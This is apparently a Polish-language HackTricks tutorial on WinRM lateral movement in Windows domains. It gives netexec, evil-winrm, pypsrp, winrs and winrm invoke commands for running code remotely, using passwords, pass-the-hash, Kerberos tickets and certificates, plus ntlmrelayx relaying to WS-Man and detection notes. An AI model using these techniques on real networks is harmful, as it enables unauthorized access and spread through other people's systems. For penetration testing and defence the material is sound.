# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM to jeden z najwygodniejszych transportów **lateral movement** w środowiskach Windows, ponieważ zapewnia zdalną powłokę przez **WS-Man/HTTP(S)** bez konieczności stosowania sztuczek z tworzeniem usług SMB. Jeśli cel udostępnia **5985/5986**, a Twój principal ma uprawnienia do korzystania ze zdalnego zarządzania, często możesz bardzo szybko przejść od „valid creds” do „interactive shell”.

Informacje dotyczące **protocol/service enumeration**, listenerów, włączania WinRM, `Invoke-Command` oraz ogólnego użycia clienta znajdziesz tutaj:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Dlaczego operatorzy lubią WinRM

- Korzysta z **HTTP/HTTPS** zamiast SMB/RPC, więc często działa tam, gdzie blokowane jest wykonywanie w stylu PsExec.
- W przypadku **Kerberos** pozwala uniknąć wysyłania do celu danych uwierzytelniających, które można ponownie wykorzystać.
- Działa bezproblemowo z poziomu **Windows**, **Linux** oraz narzędzi **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Interaktywna ścieżka zdalnego zarządzania PowerShell uruchamia na celu **`wsmprovhost.exe`** w kontekście uwierzytelnionego użytkownika, co z operacyjnego punktu widzenia różni się od wykonywania opartego na usługach.

## Model dostępu i wymagania wstępne

W praktyce skuteczne WinRM lateral movement zależy od **trzech** rzeczy:

1. Cel ma **WinRM listener** (`5985`/`5986`), a reguły firewalla zezwalają na dostęp.
2. Konto może się **uwierzytelnić** do endpointu.
3. Konto ma uprawnienia do **otwarcia sesji zdalnego zarządzania**.

Typowe sposoby uzyskania takiego dostępu:

- **Local Administrator** na celu.
- Członkostwo w grupie **Remote Management Users** w nowszych systemach lub **WinRMRemoteWMIUsers__** w systemach/komponentach, które nadal respektują tę grupę.
- Jawnie delegowane uprawnienia do zdalnego zarządzania za pośrednictwem lokalnych security descriptorów / zmian ACL zdalnego zarządzania PowerShell.

Jeśli masz już kontrolę nad hostem z uprawnieniami administratora, pamiętaj, że możesz również **delegować dostęp WinRM bez pełnego członkostwa w grupie administratorów**, korzystając z technik opisanych tutaj:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Problemy z uwierzytelnianiem istotne podczas lateral movement

- **Kerberos wymaga nazwy hosta/FQDN**. Jeśli łączysz się przez IP, client zwykle przełącza się na **NTLM/Negotiate**.
- W przypadku **workgroup** lub nietypowych przypadków związanych z cross-trust, NTLM zazwyczaj wymaga użycia **HTTPS** albo dodania celu do **TrustedHosts** na cliencie.
- W przypadku **local accounts** używanych przez Negotiate w workgroup ograniczenia zdalne UAC mogą uniemożliwić dostęp, chyba że użyte zostanie wbudowane konto Administratora albo ustawiona zostanie wartość `LocalAccountTokenFilterPolicy=1`.
- Zdalne zarządzanie PowerShell domyślnie korzysta z **`HTTP/<host>` SPN**. W środowiskach, w których **`HTTP/<host>`** jest już zarejestrowany dla innego service account, Kerberos WinRM może zakończyć się błędem `0x80090322`; użyj SPN z określonym portem albo przełącz się na **`WSMAN/<host>`**, jeśli taki SPN istnieje.<sup>[[3]](#references)</sup>

Jeśli uzyskasz valid credentials podczas password spraying, sprawdzenie ich przez WinRM jest często najszybszym sposobem na zweryfikowanie, czy dają one dostęp do shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec do walidacji i jednorazowego wykonania
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM dla interaktywnych powłok

`evil-winrm` pozostaje najwygodniejszą opcją interaktywną z systemu Linux, ponieważ obsługuje **hasła**, **hashe NT**, **bilety Kerberos**, **certyfikaty klienta**, transfer plików oraz ładowanie PowerShell/.NET w pamięci.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Nietypowy przypadek Kerberos SPN: `HTTP` vs `WSMAN`

Gdy domyślny **`HTTP/<host>`** SPN powoduje błędy Kerberos, spróbuj zażądać/użyć biletu **`WSMAN/<host>`**. Może się to zdarzyć w utwardzonych lub nietypowych środowiskach korporacyjnych, w których **`HTTP/<host>`** jest już przypisany do innego konta usługi.<sup>[[3]](#references)</sup>
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Jest to również przydatne po nadużyciu **RBCD / S4U**, gdy konkretnie sfałszowano lub zażądano biletu usługi **WSMAN**, a nie ogólnego biletu `HTTP`.

### Uwierzytelnianie oparte na certyfikacie

WinRM obsługuje również **uwierzytelnianie certyfikatem klienta**, ale certyfikat musi być przypisany na hoście docelowym do **konta lokalnego**. Z perspektywy ofensywnej ma to znaczenie, gdy:

- skradziono lub wyeksportowano prawidłowy certyfikat klienta i klucz prywatny, które są już przypisane do WinRM;
- wykorzystano **AD CS / Pass-the-Certificate** do uzyskania certyfikatu dla podmiotu, a następnie przejścia do innej ścieżki uwierzytelniania;
- działasz w środowiskach, które celowo unikają zdalnego dostępu opartego na hasłach.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM jest znacznie rzadziej spotykany niż uwierzytelnianie za pomocą hasła/hashu/Kerberos, ale gdy występuje, może zapewnić ścieżkę **lateral movement bez hasła**, odporną na rotację haseł.

### Python / automatyzacja z `pypsrp`

Jeśli potrzebujesz automatyzacji zamiast shell operatora, `pypsrp` zapewnia obsługę WinRM/PSRP z poziomu Pythona, wraz ze wsparciem dla **NTLM**, **certificate auth**, **Kerberos** i **CredSSP**.<sup>[[2]](#references)</sup>
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
Jeśli potrzebujesz bardziej precyzyjnej kontroli niż zapewnia wysokopoziomowy wrapper `Client`, niskopoziomowe API `WSMan` + `RunspacePool` są przydatne w dwóch typowych problemach operatora:

- wymuszenie **`WSMAN`** jako usługi/SPN Kerberos zamiast domyślnego oczekiwania **`HTTP`**, używanego przez wielu klientów PowerShell;
- łączenie się z **niedomyślnym endpointem PSRP**, takim jak **JEA** / niestandardowa konfiguracja sesji, zamiast `Microsoft.PowerShell`.
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### Niestandardowe endpointy PSRP i JEA mają znaczenie podczas lateral movement

Pomyślne uwierzytelnienie WinRM **nie** zawsze oznacza uzyskanie dostępu do domyślnego, nieograniczonego endpointu `Microsoft.PowerShell`. Dojrzałe środowiska mogą udostępniać **niestandardowe konfiguracje sesji** lub endpointy **JEA** z własnymi listami ACL i zachowaniem `run-as`.<sup>[[1]](#references)</sup>

Jeśli masz już code execution na hoście Windows i chcesz zrozumieć, jakie powierzchnie remoting są dostępne, wylicz zarejestrowane endpointy:
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
Jeśli istnieje użyteczny endpoint, wskaż go jawnie zamiast korzystać z domyślnego shell:
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
Praktyczne implikacje ofensywne:

- Endpoint **restricted** może nadal wystarczyć do lateral movement, jeśli udostępnia tylko odpowiednie cmdlets/functions do kontroli usług, dostępu do plików, tworzenia procesów lub wykonywania dowolnego kodu .NET / zewnętrznych poleceń.
- **Misconfigured JEA** jest szczególnie wartościowy, gdy udostępnia niebezpieczne polecenia, takie jak `Start-Process`, szerokie wildcardy, zapisywalne providery lub niestandardowe funkcje proxy, które pozwalają ominąć zamierzone ograniczenia.
- Endpointy oparte na **RunAs virtual accounts** lub **gMSAs** zmieniają efektywny kontekst bezpieczeństwa uruchamianych poleceń. W szczególności endpoint oparty na gMSA może zapewnić **network identity on the second hop**, nawet gdy normalna sesja WinRM napotyka klasyczny problem delegacji.

## Lateral movement z użyciem natywnego Windows WinRM

### `winrs.exe`

`winrs.exe` jest wbudowany i przydatny, gdy potrzebujesz **native WinRM command execution** bez otwierania interaktywnej sesji zdalnego PowerShell:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Dwie flagi są łatwe do przeoczenia, a w praktyce mają znaczenie:

- `/noprofile` jest często wymagane, gdy zdalny principal **nie jest lokalnym administratorem**.
- `/allowdelegate` umożliwia zdalnej powłoce używanie Twoich poświadczeń wobec **trzeciego hosta** (na przykład gdy polecenie wymaga dostępu do `\\fileserver\share`).
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
W praktyce użycie `winrs.exe` zwykle skutkuje zdalnym łańcuchem procesów podobnym do:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Warto o tym pamiętać, ponieważ różni się to od `service-based exec` oraz interaktywnych sesji PSRP.

### `winrm.cmd` / WS-Man COM zamiast PowerShell remoting

Możesz również wykonywać polecenia przez **transport WinRM** bez używania `Enter-PSSession`, wywołując klasy WMI przez WS-Man. Transport nadal odbywa się przez WinRM, natomiast zdalny mechanizm wykonywania staje się **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
To podejście jest przydatne, gdy:

- Logowanie PowerShell jest intensywnie monitorowane.
- Chcesz używać **transportu WinRM**, ale nie klasycznego workflow zdalnego PowerShell.
- Tworzysz własne narzędzia korzystające z obiektu COM **`WSMan.Automation`** lub ich używasz.

## NTLM relay to WinRM (WS-Man)

Gdy SMB relay jest blokowany przez signing, a LDAP relay jest ograniczony, **WS-Man/WinRM** może nadal być atrakcyjnym celem relay. Nowoczesny `ntlmrelayx.py` zawiera serwery WinRM relay i może wykonywać relay do celów `wsman://` lub `winrms://`.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Dwie praktyczne uwagi:

- Relay jest najbardziej użyteczny, gdy cel akceptuje **NTLM**, a relayed principal ma uprawnienia do korzystania z WinRM.
- Nowszy kod Impacket obsługuje żądania **`WSMANIDENTIFY: unauthenticated`**, dzięki czemu sondy w stylu `Test-WSMan` nie przerywają przepływu Relay.

W przypadku ograniczeń dotyczących multi-hop po uzyskaniu pierwszej sesji WinRM sprawdź:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Uwagi dotyczące OPSEC i wykrywania

- **Interactive PowerShell remoting** zwykle tworzy na celu proces **`wsmprovhost.exe`**.
- **`winrs.exe`** zazwyczaj tworzy **`winrshost.exe`**, a następnie żądany proces potomny.
- Niestandardowe endpointy **JEA** mogą wykonywać działania jako konta wirtualne **`WinRM_VA_*`** lub skonfigurowane konto **gMSA**, co zmienia zarówno telemetrię, jak i zachowanie drugiego skoku w porównaniu ze zwykłą powłoką działającą w kontekście użytkownika.<sup>[[1]](#references)</sup>
- Spodziewaj się telemetrii logowania sieciowego, zdarzeń usługi WinRM oraz logowania operacyjnego PowerShell i bloków skryptów, jeśli używasz PSRP zamiast surowego `cmd.exe`.
- Jeśli potrzebujesz tylko jednego polecenia, `winrs.exe` lub jednorazowe wykonanie przez WinRM może być mniej widoczne niż długotrwała interaktywna sesja remoting.
- Jeśli Kerberos jest dostępny, preferuj **FQDN + Kerberos** zamiast IP + NTLM, aby ograniczyć zarówno problemy z zaufaniem, jak i kłopotliwe zmiany po stronie klienta w `TrustedHosts`.

## References

- [1] [Microsoft: Zagadnienia bezpieczeństwa JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [README pypsrp](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: Błąd `0x80090322` podczas łączenia PowerShell z serwerem zdalnym przez WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
